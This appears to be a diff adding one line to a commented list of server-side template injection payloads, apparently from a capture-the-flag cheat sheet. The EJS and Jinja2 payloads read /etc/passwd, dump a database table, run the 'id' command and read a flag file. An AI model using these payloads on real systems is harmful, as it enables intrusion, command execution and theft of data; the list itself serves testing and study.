@@ -55,6 +55,7 @@
 // <%= global.process.mainModule.require('fs').readFileSync('/etc/passwd') %>
 // <%- global.process.mainModule.require('./db.js').queryDb('SELECT * FROM santas_list').map(row=>row.first_name+row.last_name).join(" ") %>
 //* python jinja2
+// {{ config }}
 // {{ self.__init__.__globals__.__builtins__.open("/etc/passwd").read() }}
 // {{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
 // {{''.__class__.__mro__[2].__subclasses__()[40] ('flag.txt').read()}}
